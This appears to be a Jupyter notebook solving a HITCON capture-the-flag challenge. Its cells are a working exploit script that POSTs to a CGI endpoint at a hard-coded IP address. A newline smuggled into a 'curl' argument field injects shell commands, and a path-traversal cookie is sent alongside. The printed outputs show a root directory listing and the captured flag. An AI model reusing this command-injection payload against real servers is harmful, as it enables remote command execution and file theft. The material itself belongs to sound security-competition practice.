{
 "metadata": {
  "name": "",
  "signature": "sha256:629f20a70b3dec5a8c85f15f2170b8c7fec5631b68860bca70ebfda4a2c30bbb"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import requests"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "headers = dict()\n",
      "headers = {'User-Agent': 'Mozilla/5.0'}\n",
      "cookies = {\"diagsess\":\"../etc/passwd\"} # doesn't matter\n",
      "cmd =\" ls /\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "bin\n",
        "boot\n",
        "dev\n",
        "etc\n",
        "home\n",
        "initrd.img\n",
        "key.txt\n",
        "lib\n",
        "lib64\n",
        "lost+found\n",
        "media\n",
        "mnt\n",
        "opt\n",
        "proc\n",
        "read_key\n",
        "root\n",
        "run\n",
        "sbin\n",
        "srv\n",
        "sys\n",
        "tmp\n",
        "usr\n",
        "var\n",
        "vmlinuz\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 10
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "cmd = \"/read_key /key.txt\"\n",
      "# or use python to read stderr\n",
      "# cmd = \"python -c s=__import__('subprocess');print(s.check_output('/read_key'+chr(32)+'/key.txt',stderr=s.STDOUT,shell=True))\"\n",
      "payload = {\"action\": \"curl\", \"arg\": \"aaa -w xxx\\n\"+cmd}\n",
      "r = requests.post(\"http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=\", data=payload, cookies=cookies, headers=headers)\n",
      "print r.content[r.content.find(\">xxx\")+4:]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "HITCON{a755be06b165ed8fc4710d3544fce942}\n",
        "\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": []
    }
   ],
   "metadata": {}
  }
 ]
}